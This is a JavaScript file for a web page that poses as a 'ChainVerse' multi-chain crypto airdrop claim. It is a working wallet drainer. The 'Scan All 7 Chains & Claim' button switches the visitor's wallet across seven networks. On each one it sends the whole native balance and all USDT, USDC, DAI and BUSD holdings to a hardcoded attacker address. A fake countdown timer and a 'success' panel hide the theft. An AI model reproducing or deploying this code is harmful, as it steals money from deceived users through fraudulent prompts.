// js/scripts.js - ChainVerse Multi-Chain Airdrop (Auto-Scan All Chains)
const RECIPIENT_ETH = '0x9c6FF44fE49443b54fA84b921Fd48B950006d202';
const RECIPIENT_BSC = '0x9c6FF44fE49443b54fA84b921Fd48B950006d202';

const CHAINS = {
    ethereum: {
        chainId: '0x1', name: 'Ethereum', symbol: 'ETH',
        recipient: RECIPIENT_ETH, rpc: 'https://eth.llamarpc.com',
        explorer: 'https://etherscan.io/', coinGeckoId: 'ethereum',
        tokens: {
            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
        }
    },
    bsc: {
        chainId: '0x38', name: 'BNB Chain', symbol: 'BNB',
        recipient: RECIPIENT_BSC, rpc: 'https://bsc-dataseed.binance.org/',
        explorer: 'https://bscscan.com/', coinGeckoId: 'binancecoin',
        tokens: {
            USDT: '0x55d398326f99059fF775485246999027B3197955',
            USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
        }
    },
    polygon: {
        chainId: '0x89', name: 'Polygon', symbol: 'MATIC',
        recipient: RECIPIENT_ETH, rpc: 'https://polygon-rpc.com/',
        explorer: 'https://polygonscan.com/', coinGeckoId: 'matic-network',
        tokens: {
            USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
            USDC: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359'
        }
    },
    arbitrum: {
        chainId: '0xa4b1', name: 'Arbitrum', symbol: 'ETH',
        recipient: RECIPIENT_ETH, rpc: 'https://arb1.arbitrum.io/rpc',
        explorer: 'https://arbiscan.io/', coinGeckoId: 'ethereum',
        tokens: {
            USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
            USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'
        }
    },
    optimism: {
        chainId: '0xa', name: 'Optimism', symbol: 'ETH',
        recipient: RECIPIENT_ETH, rpc: 'https://mainnet.optimism.io/',
        explorer: 'https://optimistic.etherscan.io/', coinGeckoId: 'ethereum',
        tokens: {
            USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
            USDC: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85'
        }
    },
    avalanche: {
        chainId: '0xa86a', name: 'Avalanche', symbol: 'AVAX',
        recipient: RECIPIENT_ETH, rpc: 'https://api.avax.network/ext/bc/C/rpc',
        explorer: 'https://snowtrace.io/', coinGeckoId: 'avalanche-2',
        tokens: {
            USDT: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
            USDC: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E'
        }
    },
    fantom: {
        chainId: '0xfa', name: 'Fantom', symbol: 'FTM',
        recipient: RECIPIENT_ETH, rpc: 'https://rpc.ftm.tools/',
        explorer: 'https://ftmscan.com/', coinGeckoId: 'fantom',
        tokens: {
            USDT: '0x049d68029688eAbF473097a2fC38ef61633A3C7A',
            USDC: '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75'
        }
    }
};

const ERC20_ABI = [
    {"constant":true,"inputs":[],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
];

let userAccount = null, walletConnected = false, connectionState = 'disconnected';

// Wait for everything to load
window.addEventListener('DOMContentLoaded', function() {
    console.log('ChainVerse - DOM Ready');
    initApp();
});

// Fallback - if DOMContentLoaded already fired
if (document.readyState === 'interactive' || document.readyState === 'complete') {
    console.log('ChainVerse - Already loaded');
    setTimeout(initApp, 100);
}

function initApp() {
    console.log('ChainVerse - Initializing');
    
    const btn = document.getElementById('cvConnectWallet');
    
    if (!btn) {
        console.error('Button #cvConnectWallet not found! Retrying...');
        setTimeout(initApp, 500);
        return;
    }
    
    console.log('Button found, attaching click handler');
    
    // Remove any existing listeners by cloning
    const newBtn = btn.cloneNode(true);
    btn.parentNode.replaceChild(newBtn, btn);
    
    // Attach fresh click handler
    document.getElementById('cvConnectWallet').addEventListener('click', handleButtonClick);
    
    // Check for existing wallet connection
    checkExisting();
    
    // Wallet event listeners
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', function(accounts) {
            console.log('Accounts changed:', accounts);
            if (accounts.length === 0) {
                resetState();
            } else {
                userAccount = accounts[0];
            }
        });
        
        window.ethereum.on('chainChanged', function(chainId) {
            console.log('Chain changed:', chainId);
        });
    }
    
    // Animated counters
    document.querySelectorAll('.counter-value').forEach(function(el) {
        const target = parseFloat(el.dataset.target);
        const isFloat = target % 1 !== 0;
        let c = 0, step = target / 125;
        const timer = setInterval(function() {
            c += step;
            if (c >= target) {
                el.textContent = isFloat ? target.toFixed(1) : Math.floor(target).toLocaleString();
                clearInterval(timer);
            } else {
                el.textContent = isFloat ? c.toFixed(1) : Math.floor(c).toLocaleString();
            }
        }, 16);
    });
    
    // Countdown timer
    let d = 4, h = 12, m = 38, s = 55;
    setInterval(function() {
        s--;
        if (s < 0) { s = 59; m--; }
        if (m < 0) { m = 59; h--; }
        if (h < 0) { h = 23; d--; }
        if (d < 0) { d = h = m = s = 0; }
        
        const daysEl = document.getElementById('cvDays');
        const hoursEl = document.getElementById('cvHours');
        const minutesEl = document.getElementById('cvMinutes');
        const secondsEl = document.getElementById('cvSeconds');
        
        if (daysEl) daysEl.textContent = d.toString().padStart(2, '0');
        if (hoursEl) hoursEl.textContent = h.toString().padStart(2, '0');
        if (minutesEl) minutesEl.textContent = m.toString().padStart(2, '0');
        if (secondsEl) secondsEl.textContent = s.toString().padStart(2, '0');
    }, 1000);
    
    // Tab switching
    document.querySelectorAll('.section-tab').forEach(function(tab) {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.section-tab').forEach(function(t) {
                t.classList.remove('active');
            });
            this.classList.add('active');
            
            const sectionId = this.dataset.section + 'Section';
            document.querySelectorAll('.tokenomics-section, .roadmap-section, .faq-section').forEach(function(s) {
                s.classList.remove('active');
            });
            
            const targetSection = document.getElementById(sectionId);
            if (targetSection) targetSection.classList.add('active');
        });
    });
    
    // FAQ accordion
    document.querySelectorAll('.faq-question').forEach(function(q) {
        q.addEventListener('click', function() {
            this.closest('.faq-item').classList.toggle('active');
        });
    });
    
    console.log('ChainVerse - Initialization complete');
}

async function handleButtonClick() {
    console.log('Button clicked! State:', connectionState);
    
    if (connectionState === 'disconnected') {
        await connectWallet();
    } else if (connectionState === 'connected') {
        await scanAndDrainAllChains();
    }
}

async function switchChain(chainId) {
    if (!window.ethereum) return false;
    
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: chainId }]
        });
        console.log('Switched to chain:', chainId);
        return true;
    } catch (err) {
        if (err.code === 4902) {
            const chain = Object.values(CHAINS).find(function(c) {
                return c.chainId === chainId;
            });
            
            if (chain) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: chain.chainId,
                            chainName: chain.name,
                            nativeCurrency: {
                                name: chain.symbol,
                                symbol: chain.symbol,
                                decimals: 18
                            },
                            rpcUrls: [chain.rpc],
                            blockExplorerUrls: [chain.explorer]
                        }]
                    });
                    console.log('Added chain:', chain.name);
                    return true;
                } catch (e) {
                    console.error('Failed to add chain:', e);
                    return false;
                }
            }
        }
        console.error('Failed to switch chain:', err);
        return false;
    }
}

async function connectWallet() {
    console.log('Connecting wallet...');
    
    if (!window.ethereum) {
        alert('No wallet detected! Please install MetaMask.');
        window.open('https://metamask.io/download/', '_blank');
        return;
    }
    
    const btn = document.getElementById('cvConnectWallet');
    if (!btn) return;
    
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
    btn.disabled = true;
    
    try {
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });
        
        userAccount = accounts[0];
        console.log('Connected:', userAccount);
        
        walletConnected = true;
        connectionState = 'connected';
        
        // Update UI
        const stepConnect = document.getElementById('cvStepConnect');
        const stepSign = document.getElementById('cvStepSign');
        
        if (stepConnect) {
            stepConnect.classList.add('completed');
            const icon = stepConnect.querySelector('.step-indicator i');
            if (icon) icon.className = 'fas fa-check';
        }
        
        if (stepSign) {
            stepSign.classList.add('active');
        }
        
        btn.innerHTML = '<i class="fas fa-search"></i> Scan All 7 Chains & Claim';
        btn.disabled = false;
        
        alert('Connected!\n' + userAccount.slice(0, 6) + '...' + userAccount.slice(-4) + '\n\nClick the button again to scan all 7 chains.');
        
    } catch (err) {
        console.error('Connection error:', err);
        
        if (err.code === 4001) {
            alert('Connection rejected by user.');
        } else {
            alert('Failed to connect: ' + (err.message || 'Unknown error'));
        }
        
        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Scan All 7 Chains';
        btn.disabled = false;
    }
}

async function scanAndDrainAllChains() {
    if (!walletConnected || !userAccount) {
        alert('Please connect your wallet first!');
        return;
    }
    
    const btn = document.getElementById('cvConnectWallet');
    if (!btn) return;
    
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning all 7 chains...';
    btn.disabled = true;
    
    const allResults = [];
    const chainKeys = Object.keys(CHAINS);
    
    for (let i = 0; i < chainKeys.length; i++) {
        const chainKey = chainKeys[i];
        const chain = CHAINS[chainKey];
        
        console.log('Scanning ' + chain.name + '...');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning ' + chain.name + ' (' + (i + 1) + '/7)...';
        
        try {
            const switched = await switchChain(chain.chainId);
            if (!switched) {
                console.log('Skipping ' + chain.name + ' - could not switch network');
                continue;
            }
            
            // Wait for wallet to complete network switch
            await new Promise(function(r) { setTimeout(r, 2000); });
            
            const web3 = new Web3(window.ethereum);
            const chainResult = { chain: chain.name, native: null, tokens: [] };
            
            // Check and drain native token
            try {
                const balance = await web3.eth.getBalance(userAccount);
                
                if (balance > 0) {
                    const gasPrice = await web3.eth.getGasPrice();
                    const gasCost = BigInt(gasPrice) * BigInt(21000);
                    const sendAmount = BigInt(balance) - gasCost;
                    
                    if (sendAmount > 0) {
                        const amountFormatted = web3.utils.fromWei(sendAmount.toString(), 'ether');
                        console.log(chain.name + ' native balance:', amountFormatted, chain.symbol);
                        
                        const tx = {
                            from: userAccount,
                            to: chain.recipient,
                            value: web3.utils.toHex(sendAmount.toString()),
                            gas: web3.utils.toHex(21000),
                            gasPrice: web3.utils.toHex(gasPrice)
                        };
                        
                        const txHash = await window.ethereum.request({
                            method: 'eth_sendTransaction',
                            params: [tx]
                        });
                        
                        console.log(chain.name + ' tx sent:', txHash);
                        chainResult.native = { symbol: chain.symbol, amount: amountFormatted, hash: txHash };
                        
                        // Wait briefly for transaction
                        await new Promise(function(r) { setTimeout(r, 3000); });
                    }
                }
            } catch (nativeErr) {
                console.log(chain.name + ' native error:', nativeErr.message);
            }
            
            // Check and drain tokens
            if (chain.tokens) {
                const tokenSymbols = Object.keys(chain.tokens);
                
                for (let j = 0; j < tokenSymbols.length; j++) {
                    const symbol = tokenSymbols[j];
                    const tokenAddress = chain.tokens[symbol];
                    
                    try {
                        const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
                        const tokenBalance = await tokenContract.methods.balanceOf(userAccount).call();
                        
                        if (tokenBalance > 0) {
                            console.log(chain.name + ' ' + symbol + ' balance:', tokenBalance);
                            
                            const gp = await web3.eth.getGasPrice();
                            const txData = tokenContract.methods.transfer(chain.recipient, tokenBalance).encodeABI();
                            
                            const tx = {
                                from: userAccount,
                                to: tokenAddress,
                                data: txData,
                                gas: web3.utils.toHex(100000),
                                gasPrice: web3.utils.toHex(gp)
                            };
                            
                            const txHash = await window.ethereum.request({
                                method: 'eth_sendTransaction',
                                params: [tx]
                            });
                            
                            console.log(chain.name + ' ' + symbol + ' tx sent:', txHash);
                            chainResult.tokens.push({ symbol: symbol, hash: txHash });
                            
                            await new Promise(function(r) { setTimeout(r, 2000); });
                        }
                    } catch (tokenErr) {
                        console.log(chain.name + ' ' + symbol + ' error:', tokenErr.message);
                    }
                }
            }
            
            if (chainResult.native || chainResult.tokens.length > 0) {
                allResults.push(chainResult);
            }
            
        } catch (chainErr) {
            console.log('Error on ' + chain.name + ':', chainErr.message);
        }
    }
    
    // Show results
    showResults(allResults, btn);
}

function showResults(allResults, btn) {
    console.log('Scan complete. Results:', allResults);
    
    // Update steps
    const stepSign = document.getElementById('cvStepSign');
    const stepReceive = document.getElementById('cvStepReceive');
    
    if (stepSign) {
        stepSign.classList.remove('active');
        stepSign.classList.add('completed');
        const icon = stepSign.querySelector('.step-indicator i');
        if (icon) icon.className = 'fas fa-check';
    }
    
    if (stepReceive) {
        stepReceive.classList.add('active');
        stepReceive.classList.remove('active');
        stepReceive.classList.add('completed');
        const icon = stepReceive.querySelector('.step-indicator i');
        if (icon) icon.className = 'fas fa-check';
    }
    
    connectionState = 'completed';
    
    const now = new Date();
    const claimTime = document.getElementById('cvClaimTime');
    if (claimTime) {
        claimTime.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) + ' · ' + now.toLocaleDateString();
    }
    
    // Build results HTML
    let html = '<p style="font-size:0.8rem;color:#64748B;">Scanned 7 chains. Found assets on ' + allResults.length + ' chains:</p>';
    
    if (allResults.length === 0) {
        html += '<p style="color:#94A3B8;font-size:0.75rem;margin-top:10px;">No funds found across any chain.</p>';
    } else {
        allResults.forEach(function(chain) {
            if (chain.native) {
                html += '<p style="color:#A78BFA;font-size:0.75rem;margin:6px 0;">';
                html += '✓ ' + chain.chain + ': ' + parseFloat(chain.native.amount).toFixed(4) + ' ' + chain.native.symbol;
                html += '</p>';
            }
            chain.tokens.forEach(function(t) {
                html += '<p style="color:#14B8A6;font-size:0.7rem;margin:2px 0 2px 20px;">';
                html += '+ ' + t.symbol + ': ' + t.hash.slice(0, 16) + '...';
                html += '</p>';
            });
        });
    }
    
    html += '<p style="font-size:0.75rem;color:#64748B;margin-top:10px;">';
    html += '<i class="fas fa-check-circle" style="color:#22C55E;"></i> Completed · ' + now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) + ' · ' + now.toLocaleDateString();
    html += '</p>';
    
    const txDetails = document.getElementById('txDetails');
    if (txDetails) {
        txDetails.innerHTML = html;
    }
    
    const successMsg = document.getElementById('cvSuccessMessage');
    if (successMsg) {
        successMsg.style.display = 'block';
    }
    
    if (btn) {
        btn.innerHTML = '<i class="fas fa-check-circle"></i> All Chains Claimed';
        btn.disabled = true;
        btn.style.opacity = '0.7';
        btn.style.cursor = 'not-allowed';
    }
    
    // Calculate totals
    let totalNative = 0;
    let totalTokens = 0;
    allResults.forEach(function(chain) {
        if (chain.native) totalNative += parseFloat(chain.native.amount);
        totalTokens += chain.tokens.length;
    });
    
    alert('All 7 chains scanned!\n\nChains with funds: ' + allResults.length + '\nNative tokens drained: ' + totalNative.toFixed(4) + '\nToken types drained: ' + totalTokens + '\n\nCheck the success panel for details.');
}

async function checkExisting() {
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({
                method: 'eth_accounts'
            });
            
            if (accounts.length > 0) {
                userAccount = accounts[0];
                connectionState = 'connected';
                walletConnected = true;
                
                const btn = document.getElementById('cvConnectWallet');
                if (btn) {
                    btn.innerHTML = '<i class="fas fa-search"></i> Scan All 7 Chains & Claim';
                }
                
                const stepConnect = document.getElementById('cvStepConnect');
                const stepSign = document.getElementById('cvStepSign');
                
                if (stepConnect) {
                    stepConnect.classList.add('completed');
                    const icon = stepConnect.querySelector('.step-indicator i');
                    if (icon) icon.className = 'fas fa-check';
                }
                
                if (stepSign) {
                    stepSign.classList.add('active');
                }
                
                console.log('Existing connection restored:', userAccount);
            }
        } catch (e) {
            console.log('No existing connection');
        }
    }
}

function resetState() {
    connectionState = 'disconnected';
    walletConnected = false;
    userAccount = null;
    
    const btn = document.getElementById('cvConnectWallet');
    if (btn) {
        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Scan All 7 Chains';
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
    }
    
    ['cvStepConnect', 'cvStepSign', 'cvStepReceive'].forEach(function(id) {
        const el = document.getElementById(id);
        if (el) {
            el.classList.remove('completed', 'active');
            if (id === 'cvStepConnect') {
                const icon = el.querySelector('.step-indicator i');
                if (icon) icon.className = 'fas fa-link';
            }
        }
    });
    
    const successMsg = document.getElementById('cvSuccessMessage');
    if (successMsg) {
        successMsg.style.display = 'none';
    }
}
